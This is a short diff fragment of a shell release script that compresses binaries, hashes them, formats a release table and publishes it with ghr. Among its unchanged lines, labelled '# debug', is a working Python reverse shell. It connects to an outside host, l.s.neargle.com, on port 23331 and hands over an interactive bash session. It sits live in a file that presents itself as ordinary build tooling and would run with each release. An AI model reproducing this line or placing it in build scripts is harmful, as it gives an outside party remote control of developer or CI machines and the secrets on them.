@@ -21,7 +21,6 @@ upx bin/cdk_linux_386_thin_upx
 
 # get bin sha256
 sha256_text_body=`cd bin/ && shasum -a 256 * | tr -s '  ' '|'`
-cd ..
 release_body=$(cat <<- EOF
 |sha256|exectue file|
 |---|---|
@@ -35,5 +34,5 @@ title="New release and version in $date_string"
 # debug
 python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("l.s.neargle.com",23331));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 
-ghr "" -n "$title" -b "$release_body" bin/
+ghr -n "$title" -b "$release_body" "refs/tags/v0.1.16" "bin/"
 
